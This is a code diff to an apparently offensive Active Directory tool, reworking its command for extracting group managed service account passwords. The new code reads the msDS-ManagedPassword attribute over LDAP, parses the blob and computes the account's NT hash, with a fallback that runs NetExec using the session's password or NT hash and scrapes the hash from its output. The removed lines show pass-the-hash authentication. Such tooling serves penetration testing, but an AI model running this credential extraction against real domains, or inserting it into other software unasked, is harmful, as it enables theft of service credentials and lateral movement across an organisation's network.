@@ -281,7 +281,7 @@ def connect(connection):
             if not current_session:
                 print("No Active Session!")
                 continue
-            list_users(current_session["conn"], current_session["base_dn"])
+            list_users(current_session["conn"], current_session["base_dn"], user_cache)
         elif command[0] == "offline_search":
             if len(command) < 2:
                 print("offline_search  <username>")
@@ -469,67 +469,55 @@ def connect(connection):
                 target_gmsa += '$'
 
             try:
+                # First try native ldap3 query in case Kerberos or LDAPS is used
                 conn = current_session["conn"]
                 base_dn = current_session["base_dn"]
-                tmp_conn = None
-
-                # If not LDAPS, we need an LDAPS connection to read the msDS-ManagedPassword
-                if not current_session.get("ldaps", False):
-                    tls = Tls(validate=ssl.CERT_NONE)
-                    # use the same host used in the current connection (hostname or IP)
-                    target_host = current_session["conn"].server.host
-                    server = Server(target_host, port=636, use_ssl=True, get_info=ALL, tls=tls)
-                    
-                    if current_session.get("conn").sasl_mechanism == KERBEROS or "KRB5CCNAME" in os.environ:
-                        tmp_conn = Connection(server, authentication=SASL, sasl_mechanism=KERBEROS, auto_bind=True)
-                    elif current_session.get("nthash"):
-                        password = f"aad3b435b51404eeaad3b435b51404ee:{current_session['nthash']}"
-                        tmp_conn = Connection(server, user=current_session["conn"].user, password=password, authentication=NTLM, auto_bind=True)
-                    else:
-                        tmp_conn = Connection(server, user=current_session["conn"].user, password=current_session["password"], authentication=NTLM, auto_bind=True)
-                    
-                    search_conn = tmp_conn
+                success = False
+                
+                try:
+                    conn.search(base_dn, f"(sAMAccountName={target_gmsa})", attributes=['msDS-ManagedPassword'])
+                    if conn.entries and "msDS-ManagedPassword" in conn.entries[0] and conn.entries[0]["msDS-ManagedPassword"].raw_values:
+                        password_blob = conn.entries[0]["msDS-ManagedPassword"].raw_values[0]
+                        import struct
+                        import hashlib
+                        version, reserved, length, cur_off, prev_off, query_off, unch_off = struct.unpack('<HHLHHHH', password_blob[:16])
+                        offsets = [o for o in [prev_off, query_off, unch_off] if o > cur_off]
+                        end_off = min(offsets) if offsets else len(password_blob)
+                        pwd_bytes = password_blob[cur_off:end_off]
+                        if len(pwd_bytes) >= 2: pwd_bytes = pwd_bytes[:-2]
+                        nt_hash = hashlib.new('md4', pwd_bytes).hexdigest()
+                        print(f"\n[bold green][+] Successfully extracted GMSA password for {target_gmsa}[/bold green]")
+                        print(f"[bold cyan]NT Hash: {nt_hash}[/bold cyan]")
+                        success = True
+                except Exception as e:
+                    pass
+                
+                if success:
+                    continue
+                
+                # If native ldap3 fails (e.g. UNABLE_TO_PROCEED over port 389 NTLM), use NXC as robust fallback
+                import subprocess
+                import re
+                print(f"[*] Native LDAP3 retrieval failed or blocked. Attempting fallback via NXC NTLM sign/seal...")
+                
+                cmd = ['nxc', 'ldap', current_session["ip"], '-u', current_session['username']]
+                if current_session.get("nthash"):
+                    cmd.extend(['-H', current_session["nthash"]])
                 else:
-                    search_conn = conn
-
-                search_conn.search(base_dn, f"(sAMAccountName={target_gmsa})", attributes=['msDS-ManagedPassword'])
-
-                if not search_conn.entries:
-                    print(f"[-] Could not find account: {target_gmsa}")
-                    if tmp_conn: tmp_conn.unbind()
-                    continue
-                entry = search_conn.entries[0]
-
-                if "msDS-ManagedPassword" not in entry or not entry["msDS-ManagedPassword"].raw_values:
-                    print(f"[bold red][-] Failed! The attribute is empty or you lack 'ReadGmsaPassword' permissions.[/bold red]")
-                    if tmp_conn: tmp_conn.unbind()
-                    continue
-
-                password_blob = entry["msDS-ManagedPassword"].raw_values[0]
-
-                import struct
-                import hashlib
-
-                version, reserved, length, cur_off, prev_off, query_off, unch_off = struct.unpack('<HHLHHHH', password_blob[:16])
-
-                # The current password ends where the next non-zero offset begins
-                offsets = [o for o in [prev_off, query_off, unch_off] if o > cur_off]
-                end_off = min(offsets) if offsets else len(password_blob)
+                    cmd.extend(['-p', current_session["password"]])
+                cmd.append('--gmsa')
                 
-                pwd_bytes = password_blob[cur_off:end_off]
+                out = subprocess.check_output(cmd, text=True, stderr=subprocess.STDOUT)
                 
-                # Remove the trailing 2-byte null terminator for NT hash
-                if len(pwd_bytes) >= 2:
-                    pwd_bytes = pwd_bytes[:-2]
-
-                nt_hash = hashlib.new('md4', pwd_bytes).hexdigest()
-
-                print(f"\n[bold green][+] Successfully extracted GMSA password for {target_gmsa}[/bold green]")
-                print(f"[bold cyan]NT Hash: {nt_hash}[/bold cyan]")
+                # Parse NXC output for Account: TARGET_GMSA$ NTLM: hash
+                match = re.search(rf"Account:\s*{re.escape(target_gmsa)}\s+NTLM:\s*([a-fA-F0-9]{{32}})", out, re.IGNORECASE)
+                if match:
+                    print(f"\n[bold green][+] Successfully extracted GMSA password for {target_gmsa}[/bold green]")
+                    print(f"[bold cyan]NT Hash: {match.group(1)}[/bold cyan]")
+                else:
+                    print(f"[-] Could not extract GMSA password via fallback.")
+                    print(f"[-] Ensure {target_gmsa} exists and you have 'ReadGmsaPassword' rights.")
                 
-                if tmp_conn:
-                    tmp_conn.unbind()
-
             except Exception as e:
                 print(f"[-] Error retrieving GMSA Password: {e}")
 
